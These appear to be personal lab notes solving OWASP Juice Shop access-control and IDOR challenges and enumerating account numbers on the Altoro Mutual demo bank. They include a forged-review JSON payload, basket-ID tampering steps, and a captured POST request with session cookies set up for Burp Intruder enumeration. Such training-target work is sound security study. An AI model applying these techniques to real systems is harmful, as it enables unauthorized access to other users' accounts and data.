# Access Controls

## Access the administration section of the store.
Login and manually try URLS
URL = http://localhost:3000/#/administration
Or 
view the juice-shop.min.js and find the /administration route in the js



## Get rid of all 5-star customer feedback.
Delete five-stars from the adminstration page

## Post some feedback in another users name.	
Intercept a review request http://localhost:3000/rest/product/23/reviews
Modify json with different users email `{"message":"Fake Review","author":"morty@juice-sh.op"}`
*The score-board check isn't working*


## Change the href of the link within the O-Saft product description into http://kimminich.de.
*come back*


## IDOR Solutions

## Access someone else's basket. JuiceShop
Add items to basket
Intercept Request to view basket 
http://localhost:3000/rest/basket/4
IDOR change number to 1
Other users basket is displayed

## Account History http://demo.testfire.net/bank/account.aspx
intruder
```
POST /bank/account.aspx HTTP/1.1
Host: demo.testfire.net
Content-Length: 23
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3488.0 Safari/537.36 autochrome/red
Origin: http://demo.testfire.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://demo.testfire.net/bank/main.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: amSessionId=15463717023; ASP.NET_SessionId=sek2c5bdxjyg4h45r5io3h45; amUserInfo=UserName=anNtaXRo&Password=RGVtbzEyMzQ=; amUserId=100116014; amCreditOffer=CardType=Gold&Limit=10000&Interest=7.9
Connection: close

listAccounts=10011601§40§

```
* Sniper
* Payload Type Number
* from 40 to 99
* sort by length

